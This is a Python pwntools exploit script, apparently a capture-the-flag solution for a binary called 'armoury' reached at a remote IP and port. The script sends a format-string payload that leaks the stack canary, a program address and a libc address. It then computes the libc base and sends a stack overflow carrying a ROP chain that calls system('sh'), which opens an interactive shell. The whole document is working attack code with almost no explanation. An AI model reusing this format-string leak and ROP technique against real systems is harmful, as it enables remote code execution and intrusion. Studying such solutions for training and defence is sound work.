from pwn import *

context(os='linux', arch='x86_64')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def solve():

	#p = process("./armoury")
	p = remote('159.89.166.12', 16000)
	print p.recvrepeat(1)
	p.sendline('%12$016lx%13$016lx%14$016lx%15$016lx')
	print p.recvline()
	print p.recvline()
	test = p.recvline()
	print("[+]", test[0:16])
	print("[+] Canary", test[16:32])
	canary = int(test[16:32], 16)
	print("[+] Leaked text segment addr", test[32:48])
	text_addr_offset = int(test[32:48], 16) - 0xca0
	print("[+] addr_offset", hex(text_addr_offset))
	print("[+] Leaked libc addr offset", test[48:64])

	libc.address = int(test[48:64], 16) - 0x21b97
	print("[+] libc_offset", hex(libc.address))

	print p.recvline()
	p.sendline('DUMMY')
	print p.recvrepeat(1)

	rop2 = ROP(libc)
	rop2.raw(rop2.find_gadget(['ret']).address)
	rop2.system(next(libc.search('sh\x00')))

	print rop2.dump()

	"""
	send JUNK | CANARY | SAVED EBP | SAVED RIP |
	"""

	p.sendline("A"*24 + p64(canary) + "A"*8 + str(rop2))
	print p.recvrepeat(1)
	p.interactive()
	p.close()

if __name__ == "__main__":
	solve()
